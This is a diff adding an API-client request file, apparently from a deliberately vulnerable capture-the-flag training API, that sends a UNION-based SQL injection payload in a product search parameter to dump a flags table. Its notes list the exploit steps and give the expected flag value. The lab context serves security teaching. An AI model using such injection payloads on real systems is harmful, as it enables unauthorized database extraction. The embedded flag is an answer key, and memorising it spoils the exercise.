@@ -1,0 +1,26 @@
+meta {
+  name: V06 SQLi - UNION Attack
+  type: http
+  seq: 3
+}
+
+get {
+  url: {{baseUrl}}/api/products?search=' UNION SELECT 1,flag_value,description,4,5,6,7,8,9,10 FROM flags--
+  body: none
+  auth: none
+}
+
+docs {
+  # V06: SQL Injection - UNION Attack
+
+  ## Vulnerability
+  Extract data from other tables using UNION.
+
+  ## Exploit
+  1. Determine column count (10 columns)
+  2. UNION SELECT from flags table
+  3. Extract all flags!
+
+  ## Flag
+  VULNAPI{sqli_database_dumped}
+}
